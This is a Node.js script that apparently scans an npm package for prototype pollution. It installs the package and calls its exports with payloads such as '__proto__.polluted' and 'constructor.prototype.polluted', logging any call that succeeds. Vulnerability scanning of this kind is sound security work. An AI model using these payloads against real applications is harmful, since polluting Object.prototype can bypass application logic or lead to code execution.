const { execSync } = require('child_process');
const axios = require('axios');

function loadModule(moduleName) {
    try {
        // Try using require first
        return require(moduleName);
    } catch (err) {
        if (err.code === 'ERR_REQUIRE_ESM') {
            // If require fails due to ESM, use import
            return import(moduleName);
        } else {
            // Other errors
            throw err;
        }
    }
}

async function getNpmPackage(packageName) {
    try {
        const response = await axios.get(`https://registry.npmjs.org/${packageName}`);
        const data = response.data;

        if (data && data.name) {
            return [data.name];
        } else {
            return [];
        }
    } catch (error) {
        console.error("Error fetching package information:", error);
        return [];
    }
}

(async () => {
    // const packages = await getNpmPackagesWithKeyword('flat', 100);
    const packages = await getNpmPackage('@alizeait/unflatto');
    console.log('get npm package success');
    packages.forEach(pkg => {
        try {
            console.log('------------------------------------------------');
            console.log('[1] install package:', pkg);
            execSync(`npm install ${pkg}`);
        } catch (err) {
            console.log(err)
            process.exit()
        }
        try {
            console.log('[2] import module');
            var mod = loadModule(pkg);
        } catch (err) {
            console.log(err);
            process.exit();
        }
        console.log('[3] try itself');
        func = mod;
        try {
            //console.log('[3] - 1');
            func(obj, { '__proto__.polluted': 'nodeBoB!' });
            if (obj['polluted'] === 'nodeBoB!') {
        console.log('[+] '+mod.toString()+"(obj, { '__proto__.polluted': 'nodeBoB!' });");
                console.log('[+] prototype_pollution_success on', mod.toString());
                console.log('{}.polluted :', {}.polluted);
                delete obj.__proto__.polluted;
            }
        } catch (err) {
            //console.log(err);
        }
        try {
            //console.log('[3] - 2');
            func(obj, '__proto__.polluted', 'nodeBoB!');
            if (obj['polluted'] === 'nodeBoB!') {
        console.log('[+] '+mod.toString()+"(obj, '__proto__.polluted', 'nodeBoB!');");
        console.log('[+] prototype_pollution_success on', mod.toString());
                console.log('{}.polluted :', {}.polluted);
                delete obj.__proto__.polluted;
        }
        } catch (err) {
            //console.log(err);
        }
        try {
            //console.log('[3] - 3');
            func(obj, { 'constructor.prototype.polluted': 'nodeBoB!' });
            if (obj['polluted'] === 'nodeBoB!') {
        console.log('[+] '+mod.toString()+"(obj, { 'constructor.prototype.polluted': 'nodeBoB!' });");
                console.log('[+] prototype_pollution_success on', mod.toString());
                console.log('{}.polluted :', {}.polluted);
                delete obj.__proto__.polluted;
            }
        } catch (err) {
            //console.log(err);
        }
        try {
            //console.log('[3] - 4');
            func({ '__proto__.polluted': 'nodeBoB!' });
            if (obj['polluted'] === 'nodeBoB!') {
        console.log('[+] '+mod.toString()+"({ '__proto__.polluted': 'nodeBoB!' });");
                console.log('[+] prototype_pollution_success on', mod.toString());
                console.log('{}.polluted :', {}.polluted);
                delete obj.__proto__.polluted;
            }
        } catch (err) {
            //console.log(err);
        }
        try {
            //console.log('[3] - 5');
            func({ 'constructor.prototype.polluted': 'nodeBoB!' });
            if (obj['polluted'] === 'nodeBoB!') {
        console.log('[+] '+mod.toString()+"");
                console.log('[+] prototype_pollution_success on', mod.toString());
                console.log('{}.polluted :', {}.polluted);
                delete obj.__proto__.polluted;
            }
        } catch (err) {
            //console.log(err);
        }
        var modls = Object.keys(mod);
        //console.log(mod[modls[0]].length);
        console.log(modls);
        for (i in modls) {
            var obj = {};
            func = mod[modls[i]];
            //cnt = func.length;
            try {
                //console.log('[3] - 1');
                func(obj, { '__proto__.polluted': 'nodeBoB!' });
                if (obj['polluted'] === 'nodeBoB!') {
            console.log('[+] '+modls[i]+"(obj, { '__proto__.polluted': 'nodeBoB!' });");
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
            try {
                //console.log('[3] - 2');
                func(obj, '__proto__.polluted', 'nodeBoB!');
                if (obj['polluted'] === 'nodeBoB!') {
            console.log('[+] '+modls[i]+"(obj, '__proto__.polluted', 'nodeBoB!');");
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
            try {
                //console.log('[3] - 3');
                func(obj, { 'constructor.prototype.polluted': 'nodeBoB!' });
                if (obj['polluted'] === 'nodeBoB!') {
            console.log('[+] '+modls[i]+"(obj, { 'constructor.prototype.polluted': 'nodeBoB!' });");
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
            try {
                //console.log('[3] - 4');
                func({ '__proto__.polluted': 'nodeBoB!' });
                if (obj['polluted'] === 'nodeBoB!') {
            console.log('[+] '+modls[i]+"({ '__proto__.polluted': 'nodeBoB!' });");
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
            try {
                //console.log('[3] - 5');
                func({ 'constructor.prototype.polluted': 'nodeBoB!' });
                if (obj['polluted'] === 'nodeBoB!') {
            console.log('[+] '+modls[i]+"({ 'constructor.prototype.polluted': 'nodeBoB!' });");
                    console.log('[+] prototype_pollution_success on', modls[i]);
                    console.log('{}.polluted :', {}.polluted);
                    delete obj.__proto__.polluted;
                    continue;
                }
            } catch (err) {
                //console.log(err);
            }
        }
        try {
            console.log('[4] remove package: ', pkg);
            execSync(`npm remove ${pkg}`);
        } catch (err) {
            console.log(err);
        }

    });
})();